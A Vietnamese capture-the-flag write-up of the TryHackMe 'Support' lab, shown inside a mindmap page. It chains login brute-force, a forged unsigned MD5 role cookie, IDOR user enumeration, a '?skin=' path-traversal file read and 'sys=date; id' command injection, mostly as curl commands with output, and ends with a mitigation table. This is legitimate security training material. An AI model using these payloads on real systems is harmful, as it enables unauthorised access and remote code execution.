---
title: "writeup_LAB_THM_support"
tags:
  - excalidraw
  - mindmap
---


<div class="excalidraw-container" id="ex-c9489d18">
  <div class="excalidraw-toolbar">
    <div class="excalidraw-badge">
      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><circle cx="8.5" cy="8.5" r="1.5"></circle><polyline points="21 15 16 10 5 21"></polyline></svg>
      <span>Excalidraw Mindmap</span>
    </div>
    <div class="excalidraw-controls">
      <button type="button" class="excalidraw-btn zoom-in" title="Phóng to">🔍+</button>
      <button type="button" class="excalidraw-btn zoom-out" title="Thu nhỏ">🔍-</button>
      <button type="button" class="excalidraw-btn zoom-reset" title="Vừa màn hình">↺</button>
      <button type="button" class="excalidraw-btn fullscreen" title="Toàn màn hình">⛶</button>
    </div>
  </div>
  <div class="excalidraw-viewport">
    <div class="excalidraw-canvas-wrapper">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1057 5504" width="1057" height="5504" class="excalidraw-svg" data-width="1057" data-height="5504">
<g transform="translate(-27.09,-133.18)">

<rect x="67.08865356445312" y="173.1799774169922" width="900" height="5424" rx="8" fill="#ffffff" stroke="#e0e0e0" stroke-width="1.5" class="excalidraw-md-bg"/>
<foreignObject x="67.08865356445312" y="173.1799774169922" width="900" height="5424" class="excalidraw-foreign-md">
  <div xmlns="http://www.w3.org/1999/xhtml" class="notion-embed-card">
    <div class="notion-embed-header">
      <div class="notion-embed-header-left">
        <span class="notion-embed-icon">📝</span>
        <span class="notion-embed-title">Writeup — Support Operations Panel (TryHackMe &quot;Support&quot;)</span>
      </div>
      <a href="#doc-db7a6ae9f28dd692e8c02c52d4f43ba6a79bbd5d" class="notion-embed-jump" title="Cuộn xuống đọc chi tiết toàn bộ nội dung">↓ Đọc bài viết</a>
    </div>
    <div class="notion-embed-body">
      <h1>Writeup — Support Operations Panel (TryHackMe &quot;Support&quot;)</h1>
<p><strong>Mục tiêu:</strong> <code>http://10.48.187.204/</code>
<strong>Ngày:</strong> 29/08/2026
<strong>Thư mục:</strong> <code>/home/ti/SEUCURITY_LABLAB/THM/support_lab/</code>
<strong>Kết quả cuối:</strong> Lấy được flag admin (<code>THM{I_AM_ADMIN999}</code>) và flag user (<code>THM{GOT_THE_FLAG001}</code>) — đạt RCE.</p>
<hr>
<h2>Tóm tắt chuỗi khai thác (Attack Chain)</h2>
<pre><code>Brute-force login ──► Cookie tampering (isITUser=md5(&quot;true&quot;))
   ──► IDOR /user/{id} ──► tìm admin email
   ──► Constrained LFI (?skin=) ──► đọc master password
   ──► Login admin ──► Command Injection (sys=) ──► RCE ──► FLAG
</code></pre>
<p>5 lỗ hổng được xích lại với nhau:</p>
<ol>
<li><strong>Brute-force</strong> (không rate limiting) → có tài khoản <code>help@support.thm</code></li>
<li><strong>Cookie tampering</strong> (<code>isITUser</code> = hash boolean, không ký) → leo quyền IT</li>
<li><strong>IDOR</strong> trên API <code>/user/{id}</code> → lộ email admin</li>
<li><strong>Constrained LFI</strong> qua <code>?skin=</code> → đọc source <code>config.php</code> lộ master password</li>
<li><strong>Command Injection</strong> qua <code>sys=</code> → RCE</li>
</ol>
<hr>
<h2>Bước 0 — Recon trong <code>/info.php</code></h2>
<p><code>/info.php</code> là trang <code>phpinfo()</code> công khai, lộ cấu hình sẵn dùng cho các bước sau:</p>
<pre><code class="language-bash">curl -s http://10.48.187.204/info.php
</code></pre>
<p>Thông tin thu được:</p>
<ul>
<li>PHP <code>8.3.6</code>, Apache Ubuntu, <code>DOCUMENT_ROOT=/var/www/html</code></li>
<li><code>disable_functions</code>: <strong>no value</strong> (hàm system không bị chặn)</li>
<li><code>session.save_path=/var/lib/php/sessions</code></li>
<li>Website chạy user <code>www-data</code></li>
</ul>
<hr>
<h2>Bước 1 — Liệt kê endpoints &amp; thư mục</h2>
<pre><code class="language-bash"># Quét thư mục với gobuster
gobuster dir -u http://10.48.187.204/ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x php,html,txt,bak -o gobuster.txt

# Kiểm tra directory listing
curl -s http://10.48.187.204/includes/
curl -s http://10.48.187.204/skins/
</code></pre>
<p>Kết quả:</p>
<pre><code>/index.php        (200)  login
/config.php       (200)  0 bytes  (file cấu hình, không output)
/footer.php       (200)  chứa theme selector ?skin=
/info.php         (200)  phpinfo
/dashboard.php    (302 → index)  auth-gated
/api.php          (302 → index)  auth-gated
/logout.php       (302 → index)
/includes/{header.php, skin.php}
/skins/{default.php, blue.php, green.php, red.php}
</code></pre>
<hr>
<h2>Bước 2 — Brute-force đăng nhập (không rate limiting)</h2>
<p><strong>Khóa username:</strong> trang login hiển thị placeholder/contact <strong><code>help@support.thm</code></strong> → đây là tài khoản hợp lệ.</p>
<p><strong>Khóa khác:</strong> form không giới hạn số lần thử (gửi 50 req/giây vẫn 200), nên brute-force thoải mái.</p>
<p>Dùng script Python dò nhiều luồng, tín hiệu thành công = phản hồi <strong>302 redirect sang <code>/dashboard.php</code></strong> hoặc <strong>Set-Cookie <code>isITUser=...</code></strong>:</p>
<pre><code class="language-bash"># thử thủ công vài mật khẩu để xác nhận tín hiệu
curl -s -D - -o /dev/null -X POST \
  --data-urlencode &quot;email=help@support.thm&quot; --data-urlencode &quot;password=x&quot; \
  http://10.48.187.204/ | grep -iE &#39;HTTP/|Location|set-cookie&#39;
</code></pre>
<p>Tài khoản tìm được:</p>
<pre><code>email    : help@support.thm
password : snoopy
</code></pre>
<hr>
<h2>Bước 3 — Đăng nhập &amp; Cookie Tampering (Broken Access Control)</h2>
<p>Đăng nhập lưu cookie:</p>
<pre><code class="language-bash">curl -s -c cookies.txt -L -X POST \
  --data-urlencode &quot;email=help@support.thm&quot; \
  --data-urlencode &quot;password=snoopy&quot; \
  http://10.48.187.204/
</code></pre>
<p>Kiểm tra cookie (trong <code>/tmp/dash.html</code>, dashboard):</p>
<pre><code class="language-bash">cat cookies.txt | grep -iE &#39;phpsessid|isituser&#39;
</code></pre>
<p>Kết quả — dashboard set cookie <strong><code>isITUser</code></strong>:</p>
<pre><code>isITUser=68934a3e9455fa72420237eb05902327
PHPSESSID=...
</code></pre>
<p><strong>Phân tích:</strong> giá trị 32 ký tự hex = <strong>MD5</strong>. Giải mã:</p>
<pre><code class="language-bash">echo -n &quot;false&quot; | md5sum   # 68934a3e9455fa72420237eb05902327  ✔ khớp!
echo -n &quot;true&quot;  | md5sum   # b326b5062b2f0e69046810717534cb09
</code></pre>
<p>→ Cookie lưu hash của boolean <strong>role</strong>, <strong>không ký/tamper-proof</strong> → chỉ cần đổi sang <code>md5(&quot;true&quot;)</code>.</p>
<p><strong>Forge cookie để thành IT User:</strong></p>
<pre><code class="language-bash">SID=$(grep -i phpsessid cookies.txt | awk &#39;{print $NF}&#39;)
CK=&quot;PHPSESSID=$SID; isITUser=b326b5062b2f0e69046810717534cb09&quot;

# xác nhận mở khóa IT Admin Panel
curl -s -b &quot;$CK&quot; http://10.48.187.204/dashboard.php | grep -iE &#39;IT Admin|View API&#39;
</code></pre>
<p>→ Xuất hiện <strong>&quot;IT Admin Panel&quot;</strong> với nút <strong>View API</strong>.</p>
<hr>
<h2>Bước 4 — IDOR trên API <code>/user/{id}</code></h2>
<p>API <code>api.php</code> route qua <strong>PATH_INFO</strong> dạng <code>/user/{id}</code>. Trước khi đổi cookie (helpdesk) nó <strong>khóa về đúng user của mình (id=3)</strong>; sau khi thành IT User mới liệt kê được người khác.</p>
<p>Enumerate user ID:</p>
<pre><code class="language-bash">for id in $(seq 1 10); do
  echo &quot;--- /user/$id ---&quot;
  curl -s -b &quot;$CK&quot; &quot;http://10.48.187.204/user/$id&quot;; echo
done
</code></pre>
<p>Kết quả (đã xác minh):</p>
<pre><code>/user/1 → { &quot;email&quot;: &quot;specialadmin@support.thm&quot;, &quot;2FA&quot;: false, &quot;admin&quot;: true  }
/user/2 → { &quot;email&quot;: &quot;IT@support.thm&quot;,           &quot;2FA&quot;: false, &quot;admin&quot;: false }
/user/3 → { &quot;email&quot;: &quot;help@support.thm&quot;,         &quot;2FA&quot;: false, &quot;admin&quot;: false }
/user/4 → null
</code></pre>
<blockquote>
<p>⚠️ Phải gọi <strong><code>/user/{id}</code></strong> (path), KHÔNG phải <code>/api.php/user/{id}</code> (cái này hiển thị HTML tĩnh và bỏ qua tham số).</p>
</blockquote>
<p><strong>Kết quả:</strong> tìm được admin <strong><code>specialadmin@support.thm</code></strong> (admin: true).</p>
<hr>
<h2>Bước 5 — Constrained LFI qua <code>?skin=</code> để đọc source</h2>
<p>Dashboard có theme selector <code>?skin=default|red|green|blue</code>. Nó <code>include()</code> file <code>skins/{value}.php</code> không whitelist → <strong>LFI bị giới hạn (.php)</strong>, nhưng vẫn đọc được các file <code>.php</code> của server, <strong>in raw source</strong> (kể cả <code>&lt;?php</code>).</p>
<p>Đọc <code>config.php</code> (chứa master password):</p>
<pre><code class="language-bash">curl -s -b &quot;$CK&quot; \
  &quot;http://10.48.187.204/dashboard.php?skin=../../../../../var/www/html/config&quot; \
  | grep -iE &#39;password|MASTER|SITE&#39;
</code></pre>
<p>Kết quả lộ source:</p>
<pre><code class="language-php">&lt;?php
$MASTER_PASSWORD = &#39;support@110&#39;;
$SITE_VER  = &#39;1.0&#39;;
$SITE_NAME = &#39;support_portal&#39;;
</code></pre>
<p><strong>Master password = <code>support@110</code>.</strong></p>
<hr>
<h2>Bước 6 — Login admin</h2>
<p>Ghép email admin + password từ config. <strong>Mẹo:</strong> server <strong>loại bỏ ký tự <code>@</code></strong> khi so sánh → password thực tế dùng là <code>support110</code> (bỏ <code>@</code>):</p>
<pre><code class="language-bash"># dùng mật khẩu có @ (bị lỗi - ở lại login)
curl -s -L -X POST \
  --data-urlencode &quot;email=specialadmin@support.thm&quot; \
  --data-urlencode &quot;password=support@110&quot; http://10.48.187.204/ | grep -iE &#39;Welcome&#39;

# ✔ đúng: bỏ @
curl -s -c admin.cookie -L -X POST \
  --data-urlencode &quot;email=specialadmin@support.thm&quot; \
  --data-urlencode &quot;password=support110&quot; http://10.48.187.204/ \
  | grep -iE &#39;THM|Administrator&#39;
</code></pre>
<p>Kết quả — <strong>FLAG 1 (admin)</strong>:</p>
<pre><code>🎯 Administrator Access Confirmed
THM{I_AM_ADMIN999}
</code></pre>
<hr>
<h2>Bước 7 — Command Injection (<code>sys=</code>) → RCE</h2>
<p>Admin dashboard có widget chọn &quot;Date&quot;/&quot;Time&quot; gửi POST tham số <strong><code>sys</code></strong> vào <code>shell_exec()</code>. Source lộ ra điều kiện: <strong><code>$sys</code> phải bắt đầu bằng <code>date</code></strong> → ta chèn sau dấu <code>;</code>.</p>
<p>Xác nhận RCE (chạy <code>id</code>):</p>
<pre><code class="language-bash">curl -s -b admin.cookie -X POST \
  --data-urlencode &quot;sys=date; id&quot; \
  http://10.48.187.204/dashboard.php | grep -iE &#39;uid=&#39;
</code></pre>
<p>Kết quả:</p>
<pre><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</code></pre>
<p><strong>Đọc flag user:</strong></p>
<pre><code class="language-bash">curl -s -b admin.cookie -X POST \
  --data-urlencode &quot;sys=date; cat /home/ubuntu/user.txt&quot; \
  http://10.48.187.204/dashboard.php | grep -iE &#39;THM&#39;
</code></pre>
<p><strong>FLAG 2 (user): <code>THM{GOT_THE_FLAG001}</code></strong></p>
<p><em>(Không có <code>root.txt</code> — user <code>www-data</code> không đủ quyền truy cập <code>/root</code>; flag user là mục tiêu cuối của room.)</em></p>
<hr>
<h2>Kết quả cuối</h2>
<table>
<thead>
<tr>
<th align="left">Hạng mục</th>
<th align="left">Giá trị</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Tài khoản helpdesk</td>
<td align="left"><code>help@support.thm</code> / <code>snoopy</code></td>
</tr>
<tr>
<td align="left">Cookie IT (forged)</td>
<td align="left"><code>isITUser=b326b5062b2f0e69046810717534cb09</code> (= md5 &quot;true&quot;)</td>
</tr>
<tr>
<td align="left">Admin email</td>
<td align="left"><code>specialadmin@support.thm</code></td>
</tr>
<tr>
<td align="left">Master password</td>
<td align="left"><code>support@110</code> → dùng <code>support110</code></td>
</tr>
<tr>
<td align="left"><strong>Flag admin</strong></td>
<td align="left"><strong><code>THM{I_AM_ADMIN999}</code></strong></td>
</tr>
<tr>
<td align="left"><strong>Flag user</strong></td>
<td align="left"><strong><code>THM{GOT_THE_FLAG001}</code></strong></td>
</tr>
</tbody></table>
<hr>
<h2>Tổng hợp lỗ hổng (Mitigation tương ứng)</h2>
<table>
<thead>
<tr>
<th align="left">#</th>
<th align="left">Lỗ hổng</th>
<th align="left">Bản chất</th>
<th align="left">Khắc phục</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left">No rate limiting</td>
<td align="left">Brute-force được</td>
<td align="left">Rate limit / account lockout / CAPTCHA</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">Cookie tamper</td>
<td align="left"><code>isITUser</code> = unsigned MD5 của boolean</td>
<td align="left">Dùng session server-side, sign cookie, không dùng client để quyết định quyền</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">IDOR (BOLA)</td>
<td align="left"><code>/user/{id}</code> không kiểm tra quyền sở hữu</td>
<td align="left">Kiểm tra authorization trước khi trả object</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left">Constrained LFI</td>
<td align="left"><code>?skin=</code> include không whitelist</td>
<td align="left">Whitelist nghiêm ngặt giá trị skin</td>
</tr>
<tr>
<td align="left">5</td>
<td align="left">Command Injection</td>
<td align="left"><code>sys=</code> nối thẳng vào <code>shell_exec</code></td>
<td align="left">Không truyền input người dùng vào shell; dùng whitelist lệnh</td>
</tr>
<tr>
<td align="left">6</td>
<td align="left">Config lộ qua LFI</td>
<td align="left"><code>config.php</code> chứa password cleartext</td>
<td align="left">Không nhúng secret trong source; cấu hình ngoài docroot</td>
</tr>
</tbody></table>

    </div>
  </div>
</foreignObject>

</g>
<g transform="translate(-27.09,-133.18)">
<path d="M1043.55 1003.12 L1043.55 1003.12" stroke="#1e1e1e" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-27.09,-133.18)">
<text x="318.28" y="386.10" font-family="'DFVN-excalidraw', 'DFVN Excalifont', Virgil, cursive" font-size="20" fill="#c2255c" text-anchor="start"><tspan x="318.28" dy="0">đại khái là mình hiểu hoàn toàn những gì ở đây</tspan></text>
</g>
<g transform="translate(-27.09,-133.18)">
<path d="M500.32 2021.96 L502.18 2022.41 L506.65 2022.41 L512.65 2022.19 L523.78 2021.89 L531.05 2021.82 L537.25 2021.82 L540.18 2021.89 L545.65 2021.96 L550.78 2022.26 L555.12 2022.48 L558.72 2022.78 L560.45 2023.01 L560.45 2023.01" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-27.09,-133.18)">
<path d="M561.32 2003.55 L560.05 2003.77 L560.72 2006.82 L561.52 2009.34 L562.12 2011.94 L562.52 2014.84 L562.58 2016.32 L562.25 2019.44 L561.25 2022.78 L559.45 2026.57 L556.78 2030.51 L553.12 2034.44 L548.78 2037.78 L544.65 2040.01 L544.65 2040.01" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-27.09,-133.18)">
<path d="M595.05 1996.87 L595.05 1995.38 L595.58 1996.27 L595.98 1999.24 L596.25 2002.73 L596.45 2004.51 L596.72 2008.38 L597.18 2014.17 L597.65 2017.88 L597.98 2021.30 L598.32 2024.12 L598.52 2026.27 L598.72 2027.83 L598.98 2028.87 L598.85 2027.23 L598.25 2021.44 L597.72 2013.65 L597.65 2008.60 L597.52 2004.37 L597.65 2000.28 L597.78 1998.50 L598.05 1995.23 L598.58 1992.26 L599.32 1989.74 L599.65 1988.78 L600.52 1987.29 L601.32 1986.55 L602.52 1986.32 L603.92 1988.11 L604.45 1989.29 L605.52 1992.19 L606.25 1995.46 L606.78 1999.02 L606.92 2002.73 L606.85 2006.30 L606.52 2009.79 L605.85 2013.20 L605.12 2016.32 L604.72 2017.81 L603.72 2020.26 L601.72 2023.15 L600.38 2024.12 L599.05 2024.49 L599.05 2024.49" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-27.09,-133.18)">
<path d="M607.18 2008.45 L607.65 2009.42 L607.72 2010.68 L607.98 2012.16 L608.32 2013.20 L608.65 2014.24 L609.12 2015.43 L609.98 2015.95 L610.85 2015.21 L611.32 2014.02 L611.72 2012.76 L612.05 2011.72 L612.38 2010.61 L613.05 2011.35 L613.65 2012.31 L614.45 2013.06 L615.92 2012.76 L616.65 2012.16 L617.18 2011.35 L617.85 2010.31 L618.52 2009.56 L619.52 2010.01 L620.32 2010.75 L621.12 2011.57 L622.12 2012.38 L623.05 2013.13 L624.25 2013.58 L625.58 2013.65 L626.65 2013.28 L627.12 2012.38 L626.92 2011.12 L625.85 2011.50 L626.12 2012.68 L626.65 2013.72 L627.38 2014.54 L628.45 2014.84 L629.18 2013.95 L629.45 2012.68 L629.58 2011.20 L629.78 2010.01 L629.98 2008.53 L630.72 2009.64 L631.32 2012.83 L631.78 2015.88 L631.92 2017.51 L632.32 2020.93 L632.58 2024.49 L632.85 2027.98 L632.92 2031.32 L632.92 2034.51 L632.92 2035.85 L632.92 2038.00 L632.85 2039.78 L632.65 2041.27 L632.45 2042.38 L631.85 2043.57 L630.52 2043.87 L628.38 2042.38 L625.92 2039.56 L623.72 2035.78 L622.72 2033.77 L622.72 2033.77" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-27.09,-133.18)">
<path d="M617.05 1985.73 L621.45 1986.10 L625.38 1986.84 L629.72 1988.18 L631.78 1989.00 L631.78 1989.00" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-27.09,-133.18)">
<path d="M663.45 2019.88 L664.18 2018.77 L664.92 2017.51 L666.38 2014.46 L667.72 2010.68 L668.65 2007.41 L669.78 2003.18 L670.05 2002.06 L670.38 2000.51 L670.32 1998.87 L669.38 1999.39 L669.58 2003.48 L669.85 2006.97 L670.12 2010.75 L670.32 2014.84 L670.38 2018.92 L670.38 2023.01 L670.32 2026.79 L670.12 2030.43 L669.85 2033.55 L669.78 2034.81 L669.58 2036.81 L669.38 2038.38 L669.12 2039.41 L668.38 2040.46 L667.25 2040.23 L666.25 2039.19 L665.72 2038.38 L664.45 2035.48 L664.12 2033.70 L664.05 2032.14 L664.32 2030.65 L665.65 2027.91 L666.92 2025.83 L668.38 2023.97 L671.18 2021.00 L673.18 2018.85 L675.12 2016.62 L676.12 2015.43 L678.12 2012.91 L680.05 2010.08 L681.65 2007.48 L683.05 2004.96 L683.98 2002.88 L684.72 2001.32 L685.18 2000.13 L685.25 1998.87 L684.98 1997.83 L684.38 1998.58 L684.25 2000.13 L684.38 2001.77 L684.45 2005.11 L684.45 2008.82 L684.38 2014.54 L684.25 2018.40 L684.12 2022.26 L683.98 2026.05 L683.72 2029.54 L683.58 2032.73 L683.38 2034.22 L683.12 2036.81 L682.85 2038.89 L682.58 2040.53 L682.18 2041.71 L681.38 2042.83 L680.18 2042.98 L678.98 2041.42 L677.85 2038.97 L676.98 2036.37 L676.45 2034.07 L676.32 2032.14 L676.45 2030.51 L677.12 2028.65 L678.12 2026.57 L679.32 2024.64 L680.78 2022.86 L682.32 2021.07 L683.85 2019.37 L685.25 2017.58 L686.52 2015.80 L687.65 2014.09 L688.58 2012.68 L689.18 2011.35 L689.72 2010.01 L690.18 2008.82 L690.45 2007.63 L690.65 2006.52 L690.92 2004.96 L691.18 2003.70 L691.38 2002.51 L691.52 2001.32 L691.72 2000.06 L692.18 2000.95 L692.18 2002.29 L692.18 2003.77 L692.45 2006.52 L692.45 2008.90 L692.52 2010.98 L692.72 2014.09 L692.85 2015.28 L693.05 2016.62 L693.52 2017.58 L694.65 2017.36 L695.72 2015.80 L696.72 2013.58 L698.05 2010.46 L698.72 2008.90 L699.25 2007.63 L699.72 2006.37 L700.05 2005.41 L700.38 2004.37 L700.25 2005.78 L700.25 2007.48 L700.12 2008.90 L700.12 2010.53 L700.32 2011.72 L701.45 2011.35 L702.12 2010.31 L702.72 2009.42 L703.52 2007.86 L704.18 2006.67 L704.58 2005.78 L705.18 2004.66 L705.72 2003.77 L706.12 2005.11 L706.25 2008.97 L706.12 2012.31 L706.05 2014.02 L706.05 2017.58 L705.85 2021.15 L705.52 2024.93 L704.98 2030.21 L704.52 2033.55 L704.05 2036.59 L703.65 2039.26 L703.38 2040.38 L702.98 2042.01 L702.65 2043.28 L702.12 2044.17 L701.12 2043.20 L700.52 2040.68 L699.78 2036.37 L699.78 2033.47 L699.98 2031.99 L700.58 2029.31 L701.72 2026.79 L703.25 2024.41 L705.32 2022.04 L707.85 2019.66 L710.65 2017.36 L713.18 2015.21 L715.38 2013.28 L716.38 2012.38 L718.85 2010.08 L719.52 2009.34 L720.32 2008.08 L720.85 2007.04 L720.98 2005.56 L720.72 2004.14 L720.12 2003.18 L719.38 2002.51 L719.38 2004.14 L719.58 2006.15 L719.78 2007.56 L720.05 2010.68 L720.12 2014.02 L720.18 2017.36 L720.12 2020.48 L720.05 2023.60 L719.85 2026.49 L719.52 2029.76 L719.25 2031.39 L718.85 2032.66 L718.38 2033.62 L717.52 2034.22 L716.38 2034.07 L715.72 2033.25 L715.25 2032.21 L715.18 2030.95 L715.45 2029.39 L717.05 2027.16 L718.85 2025.46 L721.18 2023.90 L723.72 2022.26 L726.32 2020.63 L727.65 2019.81 L727.65 2019.81" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-27.09,-133.18)">
<path d="M770.45 2006.74 L769.85 2005.85 L768.78 2005.41 L767.52 2005.93 L765.78 2007.48 L764.12 2009.42 L762.78 2011.57 L761.58 2013.72 L761.25 2014.76 L760.78 2016.32 L760.65 2017.58 L761.05 2018.55 L762.78 2018.40 L765.25 2017.21 L767.72 2015.80 L769.92 2013.80 L772.12 2011.50 L773.78 2008.97 L775.32 2006.52 L776.38 2004.51 L777.12 2003.11 L777.58 2002.06 L776.58 2002.43 L776.12 2003.63 L775.85 2005.03 L775.65 2006.59 L775.58 2008.08 L775.65 2009.71 L776.18 2010.53 L777.38 2010.90 L778.38 2010.23 L779.05 2009.42 L779.72 2008.75 L780.32 2007.93 L780.78 2008.82 L781.12 2010.08 L781.65 2010.90 L781.65 2010.90" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-27.09,-133.18)">
<path d="M794.58 2003.33 L793.85 2002.51 L792.72 2002.96 L791.78 2003.77 L791.18 2004.66 L790.78 2005.93 L790.98 2007.41 L791.72 2008.01 L793.05 2007.71 L793.98 2007.26 L794.65 2006.67 L795.32 2005.93 L796.12 2005.11 L797.18 2005.71 L797.18 2007.48 L797.18 2009.71 L796.85 2012.83 L796.18 2016.17 L795.45 2019.37 L794.58 2022.48 L794.05 2024.04 L792.78 2026.94 L791.25 2029.39 L789.45 2031.47 L786.45 2033.33 L784.65 2033.47 L782.92 2032.66 L781.92 2031.54 L781.92 2031.54" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-27.09,-133.18)">
<path d="M784.18 1982.09 L785.45 1982.39 L786.32 1982.91 L787.85 1983.80 L789.92 1985.28 L792.25 1986.70 L796.12 1988.92 L796.12 1988.92" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-27.09,-133.18)">
<path d="M830.52 2003.92 L830.18 2002.73 L829.58 2001.77 L828.92 2000.88 L827.98 2000.43 L826.45 2000.51 L825.38 2001.03 L823.78 2002.51 L823.05 2003.26 L821.98 2004.59 L821.38 2005.85 L821.12 2007.04 L821.12 2008.38 L821.72 2009.19 L824.05 2008.60 L826.12 2007.04 L828.18 2004.37 L830.32 2000.66 L832.18 1996.20 L834.12 1990.63 L835.52 1985.73 L836.58 1981.05 L837.12 1978.97 L837.85 1975.71 L838.52 1972.96 L838.65 1971.85 L839.05 1970.21 L839.12 1968.95 L838.65 1970.06 L838.52 1972.22 L838.32 1973.85 L838.05 1977.71 L837.85 1982.24 L837.52 1986.99 L837.05 1991.52 L836.58 1995.76 L836.05 1999.39 L835.65 2002.51 L835.38 2004.00 L834.98 2006.08 L834.65 2007.48 L833.92 2008.08 L833.65 2007.04 L833.45 2005.78 L833.72 2002.73 L834.25 2000.13 L834.72 1999.24 L835.18 1998.35 L837.12 1996.20 L838.32 1995.53 L839.58 1995.23 L840.85 1995.01 L842.45 1994.86 L843.78 1994.86 L845.18 1994.94 L846.32 1995.31 L846.58 1996.57 L846.32 1997.68 L845.85 1999.76 L845.58 2000.88 L844.92 2002.51 L844.58 2004.00 L844.38 2005.26 L844.52 2006.82 L844.85 2007.86 L846.85 2009.71 L847.78 2010.31 L850.12 2011.20 L852.92 2011.79 L854.32 2011.94 L854.32 2011.94" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-27.09,-133.18)">
<path d="M886.72 2029.24 L885.65 2029.83 L884.78 2030.43 L883.58 2031.10 L883.58 2031.10" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
</svg>
    </div>
  </div>
</div>


---

## 📖 Nội dung chi tiết bài viết (Writeup)

<div id="doc-db7a6ae9f28dd692e8c02c52d4f43ba6a79bbd5d" class="notion-callout-card">

# Writeup — Support Operations Panel (TryHackMe "Support")

**Mục tiêu:** `http://10.48.187.204/`
**Ngày:** 29/08/2026
**Thư mục:** `/home/ti/SEUCURITY_LABLAB/THM/support_lab/`
**Kết quả cuối:** Lấy được flag admin (`THM{I_AM_ADMIN999}`) và flag user (`THM{GOT_THE_FLAG001}`) — đạt RCE.

---

## Tóm tắt chuỗi khai thác (Attack Chain)

```
Brute-force login ──► Cookie tampering (isITUser=md5("true"))
   ──► IDOR /user/{id} ──► tìm admin email
   ──► Constrained LFI (?skin=) ──► đọc master password
   ──► Login admin ──► Command Injection (sys=) ──► RCE ──► FLAG
```

5 lỗ hổng được xích lại với nhau:
1. **Brute-force** (không rate limiting) → có tài khoản `help@support.thm`
2. **Cookie tampering** (`isITUser` = hash boolean, không ký) → leo quyền IT
3. **IDOR** trên API `/user/{id}` → lộ email admin
4. **Constrained LFI** qua `?skin=` → đọc source `config.php` lộ master password
5. **Command Injection** qua `sys=` → RCE

---

## Bước 0 — Recon trong `/info.php`

`/info.php` là trang `phpinfo()` công khai, lộ cấu hình sẵn dùng cho các bước sau:

```bash
curl -s http://10.48.187.204/info.php
```

Thông tin thu được:
- PHP `8.3.6`, Apache Ubuntu, `DOCUMENT_ROOT=/var/www/html`
- `disable_functions`: **no value** (hàm system không bị chặn)
- `session.save_path=/var/lib/php/sessions`
- Website chạy user `www-data`

---

## Bước 1 — Liệt kê endpoints & thư mục

```bash
# Quét thư mục với gobuster
gobuster dir -u http://10.48.187.204/ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x php,html,txt,bak -o gobuster.txt

# Kiểm tra directory listing
curl -s http://10.48.187.204/includes/
curl -s http://10.48.187.204/skins/
```

Kết quả:
```
/index.php        (200)  login
/config.php       (200)  0 bytes  (file cấu hình, không output)
/footer.php       (200)  chứa theme selector ?skin=
/info.php         (200)  phpinfo
/dashboard.php    (302 → index)  auth-gated
/api.php          (302 → index)  auth-gated
/logout.php       (302 → index)
/includes/{header.php, skin.php}
/skins/{default.php, blue.php, green.php, red.php}
```

---

## Bước 2 — Brute-force đăng nhập (không rate limiting)

**Khóa username:** trang login hiển thị placeholder/contact **`help@support.thm`** → đây là tài khoản hợp lệ.

**Khóa khác:** form không giới hạn số lần thử (gửi 50 req/giây vẫn 200), nên brute-force thoải mái.

Dùng script Python dò nhiều luồng, tín hiệu thành công = phản hồi **302 redirect sang `/dashboard.php`** hoặc **Set-Cookie `isITUser=...`**:

```bash
# thử thủ công vài mật khẩu để xác nhận tín hiệu
curl -s -D - -o /dev/null -X POST \
  --data-urlencode "email=help@support.thm" --data-urlencode "password=x" \
  http://10.48.187.204/ | grep -iE 'HTTP/|Location|set-cookie'
```

Tài khoản tìm được:

```
email    : help@support.thm
password : snoopy
```

---

## Bước 3 — Đăng nhập & Cookie Tampering (Broken Access Control)

Đăng nhập lưu cookie:

```bash
curl -s -c cookies.txt -L -X POST \
  --data-urlencode "email=help@support.thm" \
  --data-urlencode "password=snoopy" \
  http://10.48.187.204/
```

Kiểm tra cookie (trong `/tmp/dash.html`, dashboard):

```bash
cat cookies.txt | grep -iE 'phpsessid|isituser'
```

Kết quả — dashboard set cookie **`isITUser`**:
```
isITUser=68934a3e9455fa72420237eb05902327
PHPSESSID=...
```

**Phân tích:** giá trị 32 ký tự hex = **MD5**. Giải mã:

```bash
echo -n "false" | md5sum   # 68934a3e9455fa72420237eb05902327  ✔ khớp!
echo -n "true"  | md5sum   # b326b5062b2f0e69046810717534cb09
```

→ Cookie lưu hash của boolean **role**, **không ký/tamper-proof** → chỉ cần đổi sang `md5("true")`.

**Forge cookie để thành IT User:**

```bash
SID=$(grep -i phpsessid cookies.txt | awk '{print $NF}')
CK="PHPSESSID=$SID; isITUser=b326b5062b2f0e69046810717534cb09"

# xác nhận mở khóa IT Admin Panel
curl -s -b "$CK" http://10.48.187.204/dashboard.php | grep -iE 'IT Admin|View API'
```

